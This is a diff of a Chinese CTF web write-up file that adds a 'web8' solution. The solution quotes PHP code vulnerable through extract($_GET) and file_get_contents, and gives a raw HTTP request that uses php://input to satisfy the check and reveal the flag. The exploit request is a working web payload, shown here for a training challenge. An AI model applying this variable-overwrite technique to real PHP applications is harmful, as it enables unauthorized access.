@@ -583,6 +583,40 @@ die('key is: '.$key);
 构造 payload:`?id=keyakeyakey1232key:/1/akeye"`
 得到 flag
 ## web8 
+```php
+<?php  
+extract($_GET);  
+if (!empty($ac))  
+{  
+	$f = trim(file_get_contents($fn));  
+	if ($ac === $f)  
+	{  
+		echo "<p>This is flag:" ." $flag</p>";  
+	}  
+	else  
+	{  
+		echo "<p>sorry!</p>";  
+	}  
+}  
+?>  
+```
+php://input 利用
+```
+GET /web8/?ac=1&fn=php://input HTTP/1.1
+Host: 123.206.87.240:8002
+Pragma: no-cache
+Cache-Control: no-cache
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: PHPSESSID=n5l7221c9hfe7tkit4ct96b6u6994uub
+Connection: close
+Content-Length: 1
+
+1
+```
 ## 求 Getshell
 后缀名黑名单检测和类型检测
 
@@ -590,11 +624,11 @@ die('key is: '.$key);
 ![](https://upload-images.jianshu.io/upload_images/9172841-0b4859adfbdad510.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/702/format/webp)
 
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbODY3MzE1NzM2LC0xMDI2MDI1MjU3LDYwND
-U3NDc5MiwtMTIxNjQ1NDE0NywtMTY5MTI0ODQ0NCwtMTU4ODU0
-ODkzLDg2OTM3MDMzMCwxNDc2MDE5NDM5LC0yMTQ1NzcxNTA4LC
-0xMjk4ODEzMjMxLDU5MzgzNTAxLC0xMzI5NjE4MDQ0LC05ODEx
-MzU5OTAsMjU2NzQyODc2LC00OTM5MjE0MTcsMTg3OTAyMDc2My
-wxODYyMjIxNjUzLC0xMTYyNDk1ODg0LDE2NjQ5NjcxNDYsLTE4
-NTM3NjM4NDhdfQ==
+eyJoaXN0b3J5IjpbLTE1ODE5ODg0MDgsLTEwMjYwMjUyNTcsNj
+A0NTc0NzkyLC0xMjE2NDU0MTQ3LC0xNjkxMjQ4NDQ0LC0xNTg4
+NTQ4OTMsODY5MzcwMzMwLDE0NzYwMTk0MzksLTIxNDU3NzE1MD
+gsLTEyOTg4MTMyMzEsNTkzODM1MDEsLTEzMjk2MTgwNDQsLTk4
+MTEzNTk5MCwyNTY3NDI4NzYsLTQ5MzkyMTQxNywxODc5MDIwNz
+YzLDE4NjIyMjE2NTMsLTExNjI0OTU4ODQsMTY2NDk2NzE0Niwt
+MTg1Mzc2Mzg0OF19
 -->
